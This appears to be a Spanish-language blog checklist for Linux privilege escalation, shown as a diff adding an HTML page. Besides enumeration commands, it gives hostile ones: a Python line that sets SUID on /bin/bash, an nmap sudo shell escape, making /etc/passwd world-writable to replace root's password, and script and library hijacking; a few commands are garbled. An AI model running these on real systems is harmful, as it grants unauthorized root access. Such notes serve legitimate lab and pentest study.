@@ -1,0 +1,94 @@
+<p>Checklist de pruebas a realizar para escalar privilegios</p>
+
+<p><img src="/assets/images/bob.png" alt="" /></p>
+
+<h1 id="maneras-de-escalar-privilegios-en-linux">Maneras de escalar privilegios en linux</h1>
+
+<p>Si en una maquina encontramos un script con permisos root pero el contenido no sirve para elevar privilegios y no podemos modificarlo, podemos intentar borrarlo y crear uno con el mismo nombre y tendremos los mismos privilegios</p>
+
+<p>si tenemos un script en python en el que tiene permisos root podemos agregar la siguiente linea para escalar privilegios</p>
+
+<p><code class="language-plaintext highlighter-rouge">import os;os.system('chmod u+s /bin/bash')</code></p>
+
+<p>Verificar las variables de entorno con:</p>
+
+<p><code class="language-plaintext highlighter-rouge">env</code></p>
+
+<h2 id="lista-de-comandos-a-probar">Lista de comandos a probar:</h2>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -l</code> Sirve para ver si podemos ejecutar algun comando con permisos especiales</p>
+
+<p><code class="language-plaintext highlighter-rouge">find / -perm 4000 2&gt;/dev/null</code> Nos ayuda a ver binarios con permiso SUID</p>
+
+<p><code class="language-plaintext highlighter-rouge">find / -user &lt;nombre&gt; 2&gt;/dev/null</code> Podemos ver archivos de un usuario en especifico</p>
+
+<p><code class="language-plaintext highlighter-rouge">getcap -r /</code> Nos permite ver las capabilities</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat /etc/hosts</code> Nos sirve para ver si hay algun dominio que no sabemos</p>
+
+<p><code class="language-plaintext highlighter-rouge">ps -faux</code> Nos informa sobre el estado de los procesos</p>
+
+<p><code class="language-plaintext highlighter-rouge">ss -tuln</code> <code class="language-plaintext highlighter-rouge">netstat -tuln</code> Podemos ver los puertos internos abiertos</p>
+
+<p><code class="language-plaintext highlighter-rouge">nc -l</code> para abrir un puerto, nos sirve en caso de que veamos que podemos tener permiso en la maquina sobre algun puerto podemos intentar</p>
+
+<p><code class="language-plaintext highlighter-rouge">ls -la /bin/bash</code> En algunos casos podria ser que tenga permisos incorrectos y solo bastaria con hacer un bash -p</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat /etc/crontab</code> Podemos ver una lista de tareas cron</p>
+
+<h1 id="tambien-podemos-buscar-informacion-en-algun-directorio-como-los-siguientes">Tambien podemos buscar informacion en algun directorio como los siguientes</h1>
+
+<p>/var/log/ Podemos revisar los logs para ver si encontramos alguna credencial
+/var/www/ En caso de que haya un sito web corriendo, podemos buscar credenciales</p>
+
+<h1 id="algunas-tecnicas-para-escalar-privilegios">Algunas tecnicas para escalar privilegios:</h1>
+
+<h2 id="explotacion-de-una-variable-de-entorno-ld_preload">Explotacion de una variable de entorno “LD_PRELOAD”</h2>
+
+<p>Manera de como explotarlo: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>
+
+<h3 id="ejemplo-de-escalacion-con-nmap">Ejemplo de escalacion con nmap:</h3>
+
+<p><code class="language-plaintext highlighter-rouge">TF=$(mktemp</code> Crea una variable que vale un archivo temporal en una variable</p>
+
+<p><code class="language-plaintext highlighter-rouge">echo 'os.execute("/bin/sh")' &gt; $TF</code> Hace un echo a llamada de sistema ejecutando una /bin/sh y lo pasa a la variable temporal</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo -u user nmap --script=$TF</code> Ejecuta el script temporal</p>
+
+<h2 id="library-hijacking">Library hijacking</h2>
+
+<p>Consiste en secuestrar la libreria que se esta ocupando para crear un archivo llamado como la libreria usada en el directorio actual donde 
+inyectaremos el comando a ejecutar con python</p>
+<h3 id="ejemplo-de-explotacion">Ejemplo de explotacion</h3>
+
+<p><a href="https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8">https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8</a></p>
+
+<h2 id="abuso-de-permisos-mal-implementados">Abuso de permisos mal implementados</h2>
+<h3 id="ejemplo">Ejemplo:</h3>
+<p>passwd</p>
+
+<p><code class="language-plaintext highlighter-rouge">chmod o+w etc passwd</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">openssl passwd</code>
+cambiamos el passwd de contrasena x a la que creamos y hacemos un su root buscar archivos que tengamos capacidad de escritura</p>
+
+<p>` find / -writable 2&gt;/dev/null`</p>
+
+<p>en caso de algun otro archivo que no tengamos permisos de escritura pero si esta en un directorio nosotros podemos eliminarlo, lo eliminamos y creamos uno con el mismo nombre donde inyectaremos lo que nos interese</p>
+
+<h2 id="explotacion-de-kernel">Explotacion de kernel</h2>
+<p>se trata de injecciones de comandos por versiones de kernel antiguas</p>
+
+<p>dirty cow /etc/passwd
+3.2
+para buscar exploits podemos ver en linux sugester</p>
+
+<h2 id="tambien-podemos-escalar-con-timers-mal-configurados">Tambien podemos escalar con timers mal configurados</h2>
+<p>buscar timers</p>
+
+<p><code class="language-plaintext highlighter-rouge">systemctl list-timers</code></p>
+
+<p>lo podriamos detectar por pspy</p>
+
+<p>-</p>
+
